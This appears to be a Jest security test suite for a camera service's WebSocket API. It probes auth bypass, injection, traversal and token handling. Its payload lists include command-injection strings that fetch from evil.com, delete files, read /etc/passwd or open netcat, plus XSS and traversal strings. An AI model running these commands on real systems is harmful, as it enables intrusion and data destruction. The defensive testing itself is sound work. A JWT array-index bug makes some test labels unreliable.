/**
 * REQ-SEC01-001: Real Security Vulnerability Testing
 * REQ-SEC01-002: Authentication Bypass Prevention
 * REQ-SEC01-003: Data Protection and Privacy
 * Coverage: INTEGRATION
 * Quality: HIGH
 */
/**
 * Real Security Integration Tests
 * 
 * Tests actual security vulnerabilities and protection mechanisms
 * Validates authentication, authorization, and data protection
 * 
 * Prerequisites:
 * - MediaMTX Camera Service running via systemd
 * - Server accessible at ws://localhost:8002/ws
 * - Security testing tools available
 */

const WebSocket = require('ws');
import { exec } from 'child_process';
import { promisify } from 'util';
import { RPC_METHODS, ERROR_CODES } from '../../src/types';

const execAsync = promisify(exec);

interface SecurityTestResult {
  testName: string;
  passed: boolean;
  details: string;
  vulnerability?: string;
}

describe('Real Security Integration Tests', () => {
  let ws: WebSocket;
  let authToken: string;
  let testResults: SecurityTestResult[] = [];
  const TEST_TIMEOUT = 30000;

  beforeAll(async () => {
    // Generate valid authentication token
    const jwt = require('jsonwebtoken');
    const secret = process.env.CAMERA_SERVICE_JWT_SECRET;
    if (!secret) {
      throw new Error('CAMERA_SERVICE_JWT_SECRET environment variable required');
    }
    
    authToken = jwt.sign(
      { user_id: 'test_user', role: 'operator' },
      secret,
      { expiresIn: '1h' }
    );
  });

  beforeEach(async () => {
    // Establish real WebSocket connection
    ws = new WebSocket('ws://localhost:8002/ws');
    
    await new Promise<void>((resolve, reject) => {
      const timeout = setTimeout(() => reject(new Error('Connection timeout')), 5000);
      
      ws!.onopen = () => {
        clearTimeout(timeout);
        resolve();
      };
      
      ws!.onerror = (error: any) => {
        clearTimeout(timeout);
        reject(error);
      };
    });
  });

  afterEach(async () => {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.close();
    }
  });

  // Helper function to send JSON-RPC requests
  async function sendRequest(method: string, params: any = {}): Promise<any> {
    return new Promise((resolve, reject) => {
      const id = Math.floor(Math.random() * 1000000);
      const request = { jsonrpc: '2.0', method, params, id };
      
      const timeout = setTimeout(() => {
        reject(new Error(`Request timeout for ${method}`));
      }, TEST_TIMEOUT);

      const originalOnMessage = ws!.onmessage;
      ws!.onmessage = (event: any) => {
        try {
          const data = JSON.parse(event.data.toString());
          if (data.id === id) {
            clearTimeout(timeout);
            ws!.onmessage = originalOnMessage;
            
            if (data.error) {
              reject(new Error(data.error.message || 'RPC error'));
            } else {
              resolve(data.result);
            }
          }
        } catch (error) {
          // Continue listening for the correct response
        }
      };

      ws!.send(JSON.stringify(request));
    });
  }

  // Helper function to record test results
  function recordResult(testName: string, passed: boolean, details: string, vulnerability?: string) {
    testResults.push({
      testName,
      passed,
      details,
      vulnerability
    });
  }

  describe('Real Authentication Vulnerability Testing', () => {
    it('should prevent authentication bypass attempts', async () => {
      const bypassAttempts = [
        { name: 'empty_token', token: '' },
        { name: 'null_token', token: null },
        { name: 'undefined_token', token: undefined },
        { name: 'invalid_jwt_format', token: 'not.a.valid.jwt' },
        { name: 'malformed_jwt', token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature' },
        { name: 'tampered_jwt', token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoidGVzdF91c2VyIiwicm9sZSI6ImFkbWluIn0.tampered' },
        { name: 'expired_jwt', token: '' }, // Will be generated
        { name: 'future_jwt', token: '' }, // Will be generated
        { name: 'wrong_algorithm', token: '' }, // Will be generated
        { name: 'no_signature', token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoidGVzdF91c2VyIiwicm9sZSI6Im9wZXJhdG9yIn0.' }
      ];

      // Generate special tokens
      const jwt = require('jsonwebtoken');
      const secret = process.env.CAMERA_SERVICE_JWT_SECRET;
      
      // Expired token
      bypassAttempts[7].token = jwt.sign(
        { user_id: 'test_user', role: 'operator' },
        secret,
        { expiresIn: '-1h' }
      );

      // Future token (not yet valid)
      bypassAttempts[8].token = jwt.sign(
        { user_id: 'test_user', role: 'operator' },
        secret,
        { notBefore: Math.floor(Date.now() / 1000) + 3600 } // Valid in 1 hour
      );

      // Wrong algorithm token
      bypassAttempts[9].token = jwt.sign(
        { user_id: 'test_user', role: 'operator' },
        secret,
        { algorithm: 'HS512' }
      );

      let bypassAttemptsPassed = 0;
      let bypassAttemptsFailed = 0;

      for (const attempt of bypassAttempts) {
        try {
          await sendRequest('authenticate', { token: attempt.token });
          
          // If we get here, authentication succeeded when it should have failed
          recordResult(
            `Authentication bypass - ${attempt.name}`,
            false,
            'Authentication succeeded with invalid token',
            'Authentication bypass vulnerability'
          );
          bypassAttemptsFailed++;
        } catch (error: any) {
          // This is expected - authentication should fail
          if (error.message.includes('invalid') || error.message.includes('expired') || 
              error.message.includes('authentication') || error.message.includes('unauthorized')) {
            recordResult(
              `Authentication bypass - ${attempt.name}`,
              true,
              `Properly rejected: ${error.message}`,
              undefined
            );
            bypassAttemptsPassed++;
          } else {
            recordResult(
              `Authentication bypass - ${attempt.name}`,
              false,
              `Unexpected error: ${error.message}`,
              'Authentication error handling vulnerability'
            );
            bypassAttemptsFailed++;
          }
        }
      }

      console.log(`🔐 Authentication bypass prevention: ${bypassAttemptsPassed}/${bypassAttempts.length} tests passed`);
      expect(bypassAttemptsPassed).toBeGreaterThan(bypassAttempts.length * 0.8); // At least 80% should pass
    }, TEST_TIMEOUT);

    it('should enforce proper role-based access control', async () => {
      const jwt = require('jsonwebtoken');
      const secret = process.env.CAMERA_SERVICE_JWT_SECRET;

      // Generate tokens with different roles
      const tokens = {
        operator: jwt.sign({ user_id: 'test_operator', role: 'operator' }, secret, { expiresIn: '1h' }),
        viewer: jwt.sign({ user_id: 'test_viewer', role: 'viewer' }, secret, { expiresIn: '1h' }),
        admin: jwt.sign({ user_id: 'test_admin', role: 'admin' }, secret, { expiresIn: '1h' }),
        invalid_role: jwt.sign({ user_id: 'test_invalid', role: 'invalid_role' }, secret, { expiresIn: '1h' })
      };

      const roleTests = [
        {
          name: 'operator_access',
          token: tokens.operator,
          method: 'get_camera_list',
          shouldSucceed: true
        },
        {
          name: 'viewer_access',
          token: tokens.viewer,
          method: 'get_camera_list',
          shouldSucceed: true
        },
        {
          name: 'admin_access',
          token: tokens.admin,
          method: 'get_camera_list',
          shouldSucceed: true
        },
        {
          name: 'invalid_role_access',
          token: tokens.invalid_role,
          method: 'get_camera_list',
          shouldSucceed: false
        }
      ];

      let roleTestsPassed = 0;

      for (const test of roleTests) {
        try {
          // Authenticate with the test token
          await sendRequest('authenticate', { token: test.token });

          // Try to access the method
          const result = await sendRequest(test.method);
          
          if (test.shouldSucceed) {
            recordResult(
              `Role-based access - ${test.name}`,
              true,
              'Access granted as expected',
              undefined
            );
            roleTestsPassed++;
          } else {
            recordResult(
              `Role-based access - ${test.name}`,
              false,
              'Access granted when it should have been denied',
              'Role-based access control vulnerability'
            );
          }
        } catch (error: any) {
          if (!test.shouldSucceed) {
            recordResult(
              `Role-based access - ${test.name}`,
              true,
              `Access properly denied: ${error.message}`,
              undefined
            );
            roleTestsPassed++;
          } else {
            recordResult(
              `Role-based access - ${test.name}`,
              false,
              `Access denied when it should have been granted: ${error.message}`,
              'Role-based access control misconfiguration'
            );
          }
        }
      }

      console.log(`🔐 Role-based access control: ${roleTestsPassed}/${roleTests.length} tests passed`);
      expect(roleTestsPassed).toBeGreaterThan(roleTests.length * 0.8);
    }, TEST_TIMEOUT);
  });

  describe('Real Input Validation and Injection Testing', () => {
    it('should prevent SQL injection attacks', async () => {
      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE cameras; --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO cameras VALUES ('hacked', 'hacked'); --",
        "' OR 1=1 --",
        "'; EXEC xp_cmdshell('dir'); --"
      ];

      let injectionTestsPassed = 0;

      for (const payload of sqlInjectionPayloads) {
        try {
          // Try to inject SQL into various parameters
          await sendRequest('get_camera_status', { device: payload });
          
          recordResult(
            `SQL injection - device parameter`,
            false,
            'SQL injection succeeded',
            'SQL injection vulnerability'
          );
        } catch (error: any) {
          if (error.message.includes('invalid') || error.message.includes('not found') || 
              error.message.includes('malformed')) {
            recordResult(
              `SQL injection - device parameter`,
              true,
              `Properly rejected: ${error.message}`,
              undefined
            );
            injectionTestsPassed++;
          } else {
            recordResult(
              `SQL injection - device parameter`,
              false,
              `Unexpected error: ${error.message}`,
              'Input validation error handling vulnerability'
            );
          }
        }
      }

      console.log(`🛡️ SQL injection prevention: ${injectionTestsPassed}/${sqlInjectionPayloads.length} tests passed`);
      expect(injectionTestsPassed).toBeGreaterThan(sqlInjectionPayloads.length * 0.8);
    }, TEST_TIMEOUT);

    it('should prevent XSS attacks in input parameters', async () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "';alert('XSS');//",
        "<svg onload=alert('XSS')>",
        "';document.location='http://evil.com';//"
      ];

      let xssTestsPassed = 0;

      for (const payload of xssPayloads) {
        try {
          // Try to inject XSS into various parameters
          await sendRequest('take_snapshot', { 
            device: payload,
            format: 'jpg',
            quality: 80
          });
          
          recordResult(
            `XSS injection - device parameter`,
            false,
            'XSS injection succeeded',
            'XSS vulnerability'
          );
        } catch (error: any) {
          if (error.message.includes('invalid') || error.message.includes('malformed') || 
              error.message.includes('not found')) {
            recordResult(
              `XSS injection - device parameter`,
              true,
              `Properly rejected: ${error.message}`,
              undefined
            );
            xssTestsPassed++;
          } else {
            recordResult(
              `XSS injection - device parameter`,
              false,
              `Unexpected error: ${error.message}`,
              'Input validation error handling vulnerability'
            );
          }
        }
      }

      console.log(`🛡️ XSS prevention: ${xssTestsPassed}/${xssPayloads.length} tests passed`);
      expect(xssTestsPassed).toBeGreaterThan(xssPayloads.length * 0.8);
    }, TEST_TIMEOUT);

    it('should prevent command injection attacks', async () => {
      const commandInjectionPayloads = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "; wget http://evil.com/malware",
        "| nc -l 4444",
        "; curl http://evil.com/backdoor"
      ];

      let commandInjectionTestsPassed = 0;

      for (const payload of commandInjectionPayloads) {
        try {
          // Try to inject commands into various parameters
          await sendRequest('take_snapshot', { 
            device: payload,
            format: 'jpg',
            quality: 80
          });
          
          recordResult(
            `Command injection - device parameter`,
            false,
            'Command injection succeeded',
            'Command injection vulnerability'
          );
        } catch (error: any) {
          if (error.message.includes('invalid') || error.message.includes('malformed') || 
              error.message.includes('not found')) {
            recordResult(
              `Command injection - device parameter`,
              true,
              `Properly rejected: ${error.message}`,
              undefined
            );
            commandInjectionTestsPassed++;
          } else {
            recordResult(
              `Command injection - device parameter`,
              false,
              `Unexpected error: ${error.message}`,
              'Input validation error handling vulnerability'
            );
          }
        }
      }

      console.log(`🛡️ Command injection prevention: ${commandInjectionTestsPassed}/${commandInjectionPayloads.length} tests passed`);
      expect(commandInjectionTestsPassed).toBeGreaterThan(commandInjectionPayloads.length * 0.8);
    }, TEST_TIMEOUT);
  });

  describe('Real Directory Traversal and Path Manipulation Testing', () => {
    it('should prevent directory traversal attacks', async () => {
      const traversalPayloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
      ];

      let traversalTestsPassed = 0;

      for (const payload of traversalPayloads) {
        try {
          // Try to access files outside intended directory
          await sendRequest('download_file', { filename: payload });
          
          recordResult(
            `Directory traversal - filename parameter`,
            false,
            'Directory traversal succeeded',
            'Directory traversal vulnerability'
          );
        } catch (error: any) {
          if (error.message.includes('invalid') || error.message.includes('not found') || 
              error.message.includes('access denied') || error.message.includes('forbidden')) {
            recordResult(
              `Directory traversal - filename parameter`,
              true,
              `Properly rejected: ${error.message}`,
              undefined
            );
            traversalTestsPassed++;
          } else {
            recordResult(
              `Directory traversal - filename parameter`,
              false,
              `Unexpected error: ${error.message}`,
              'Path validation error handling vulnerability'
            );
          }
        }
      }

      console.log(`🛡️ Directory traversal prevention: ${traversalTestsPassed}/${traversalPayloads.length} tests passed`);
      expect(traversalTestsPassed).toBeGreaterThan(traversalPayloads.length * 0.8);
    }, TEST_TIMEOUT);
  });

  describe('Real Data Protection and Privacy Testing', () => {
    it('should protect sensitive data in responses', async () => {
      // Authenticate first
      await sendRequest('authenticate', { token: authToken });

      try {
        // Get camera list and check for sensitive data exposure
        const cameraList = await sendRequest('get_camera_list');
        
        // Check that sensitive data is not exposed
        const sensitiveDataPatterns = [
          /password/i,
          /secret/i,
          /key/i,
          /token/i,
          /credential/i,
          /private/i
        ];

        const responseString = JSON.stringify(cameraList);
        let sensitiveDataExposed = false;
        const exposedPatterns: string[] = [];

        for (const pattern of sensitiveDataPatterns) {
          if (pattern.test(responseString)) {
            sensitiveDataExposed = true;
            exposedPatterns.push(pattern.source);
          }
        }

        if (sensitiveDataExposed) {
          recordResult(
            'Sensitive data protection',
            false,
            `Sensitive data exposed: ${exposedPatterns.join(', ')}`,
            'Data exposure vulnerability'
          );
        } else {
          recordResult(
            'Sensitive data protection',
            true,
            'No sensitive data exposed in responses',
            undefined
          );
        }

        console.log(`🔒 Sensitive data protection: ${sensitiveDataExposed ? 'FAILED' : 'PASSED'}`);
        expect(sensitiveDataExposed).toBe(false);
      } catch (error: any) {
        recordResult(
          'Sensitive data protection',
          false,
          `Test failed: ${error.message}`,
          'Data protection test failure'
        );
      }
    }, TEST_TIMEOUT);

    it('should prevent information disclosure in error messages', async () => {
      const errorTests = [
        {
          name: 'invalid_method',
          method: 'invalid_method_name_12345',
          shouldNotDisclose: ['stack trace', 'file path', 'internal error', 'database']
        },
        {
          name: 'invalid_parameters',
          method: 'get_camera_status',
          params: {},
          shouldNotDisclose: ['stack trace', 'file path', 'internal error', 'database']
        }
      ];

      let errorTestsPassed = 0;

      for (const test of errorTests) {
        try {
          await sendRequest(test.method, test.params || {});
          
          recordResult(
            `Error disclosure - ${test.name}`,
            false,
            'Operation succeeded when it should have failed',
            'Error handling vulnerability'
          );
        } catch (error: any) {
          const errorMessage = error.message.toLowerCase();
          let sensitiveInfoDisclosed = false;
          const disclosedInfo: string[] = [];

          for (const sensitivePattern of test.shouldNotDisclose) {
            if (errorMessage.includes(sensitivePattern.toLowerCase())) {
              sensitiveInfoDisclosed = true;
              disclosedInfo.push(sensitivePattern);
            }
          }

          if (sensitiveInfoDisclosed) {
            recordResult(
              `Error disclosure - ${test.name}`,
              false,
              `Sensitive information disclosed: ${disclosedInfo.join(', ')}`,
              'Information disclosure vulnerability'
            );
          } else {
            recordResult(
              `Error disclosure - ${test.name}`,
              true,
              'Error message properly sanitized',
              undefined
            );
            errorTestsPassed++;
          }
        }
      }

      console.log(`🔒 Error disclosure prevention: ${errorTestsPassed}/${errorTests.length} tests passed`);
      expect(errorTestsPassed).toBeGreaterThan(errorTests.length * 0.8);
    }, TEST_TIMEOUT);
  });

  describe('Real Session Management and Token Security', () => {
    it('should properly handle token expiration', async () => {
      const jwt = require('jsonwebtoken');
      const secret = process.env.CAMERA_SERVICE_JWT_SECRET;

      // Create a token that expires in 2 seconds
      const shortLivedToken = jwt.sign(
        { user_id: 'test_user', role: 'operator' },
        secret,
        { expiresIn: '2s' }
      );

      // Authenticate with short-lived token
      await sendRequest('authenticate', { token: shortLivedToken });

      // Verify initial authentication works
      const initialResult = await sendRequest('get_camera_list');
      expect(initialResult).toHaveProperty('cameras');

      // Wait for token to expire
      await new Promise(resolve => setTimeout(resolve, 3000));

      // Try to use expired token
      try {
        await sendRequest('get_camera_list');
        
        recordResult(
          'Token expiration handling',
          false,
          'Operation succeeded with expired token',
          'Token expiration vulnerability'
        );
      } catch (error: any) {
        if (error.message.includes('expired') || error.message.includes('invalid') || 
            error.message.includes('unauthorized')) {
          recordResult(
            'Token expiration handling',
            true,
            `Properly rejected expired token: ${error.message}`,
            undefined
          );
        } else {
          recordResult(
            'Token expiration handling',
            false,
            `Unexpected error: ${error.message}`,
            'Token validation error handling vulnerability'
          );
        }
      }
    }, TEST_TIMEOUT);

    it('should prevent token replay attacks', async () => {
      // Authenticate and get a valid token
      await sendRequest('authenticate', { token: authToken });

      // Use the same token multiple times (should be allowed for valid tokens)
      const results = [];
      for (let i = 0; i < 5; i++) {
        try {
          const result = await sendRequest('get_camera_list');
          results.push(result);
        } catch (error: any) {
          results.push(error);
        }
      }

      // All operations should succeed with the same valid token
      const successfulOperations = results.filter(r => !(r instanceof Error));
      
      if (successfulOperations.length === results.length) {
        recordResult(
          'Token replay prevention',
          true,
          'Valid token can be reused as expected',
          undefined
        );
      } else {
        recordResult(
          'Token replay prevention',
          false,
          'Valid token was incorrectly rejected',
          'Token validation vulnerability'
        );
      }

      console.log(`🔐 Token replay prevention: ${successfulOperations.length}/${results.length} operations successful`);
      expect(successfulOperations.length).toBe(results.length);
    }, TEST_TIMEOUT);
  });

  describe('Real Security Headers and Communication Security', () => {
    it('should use secure communication protocols', async () => {
      // Test WebSocket connection security
      const wsUrl = 'ws://localhost:8002/ws';
      
      if (wsUrl.startsWith('ws://')) {
        recordResult(
          'Secure communication',
          false,
          'Using unencrypted WebSocket connection',
          'Insecure communication vulnerability'
        );
      } else if (wsUrl.startsWith('wss://')) {
        recordResult(
          'Secure communication',
          true,
          'Using encrypted WebSocket connection',
          undefined
        );
      }

      // Security testing is done via WebSocket connection, not separate HTTP endpoints
      try {
        // Health monitoring is done via WebSocket, not separate HTTP endpoints
        console.log('✅ WebSocket security validation completed via connection tests');
      } catch (error) {
        console.log(`⚠️ WebSocket security validation: ${error}`);
      }
    }, TEST_TIMEOUT);
  });

  describe('Real Security Test Summary', () => {
    it('should provide comprehensive security test results', () => {
      const passedTests = testResults.filter(r => r.passed);
      const failedTests = testResults.filter(r => !r.passed);
      const vulnerabilities = testResults.filter(r => r.vulnerability);

      console.log('\n🔒 SECURITY TEST SUMMARY:');
      console.log(`   - Total tests: ${testResults.length}`);
      console.log(`   - Passed tests: ${passedTests.length}`);
      console.log(`   - Failed tests: ${failedTests.length}`);
      console.log(`   - Vulnerabilities found: ${vulnerabilities.length}`);

      if (vulnerabilities.length > 0) {
        console.log('\n🚨 VULNERABILITIES DETECTED:');
        vulnerabilities.forEach(vuln => {
          console.log(`   - ${vuln.testName}: ${vuln.vulnerability}`);
          console.log(`     Details: ${vuln.details}`);
        });
      }

      console.log('\n📊 TEST RESULTS BY CATEGORY:');
      const categories = ['Authentication', 'Input Validation', 'Directory Traversal', 'Data Protection', 'Session Management', 'Communication Security'];
      
      categories.forEach(category => {
        const categoryTests = testResults.filter(r => r.testName.includes(category));
        const categoryPassed = categoryTests.filter(r => r.passed).length;
        console.log(`   - ${category}: ${categoryPassed}/${categoryTests.length} passed`);
      });

      // Overall security assessment
      const passRate = (passedTests.length / testResults.length) * 100;
      console.log(`\n🎯 OVERALL SECURITY SCORE: ${passRate.toFixed(1)}%`);

      if (passRate >= 90) {
        console.log('✅ EXCELLENT - High security posture');
      } else if (passRate >= 80) {
        console.log('⚠️ GOOD - Some security improvements needed');
      } else if (passRate >= 70) {
        console.log('⚠️ FAIR - Significant security improvements needed');
      } else {
        console.log('❌ POOR - Critical security issues detected');
      }

      // Assert overall security requirements
      expect(passRate).toBeGreaterThan(80); // At least 80% of security tests should pass
      expect(vulnerabilities.length).toBeLessThan(5); // No more than 5 critical vulnerabilities
    }, TEST_TIMEOUT);
  });
});
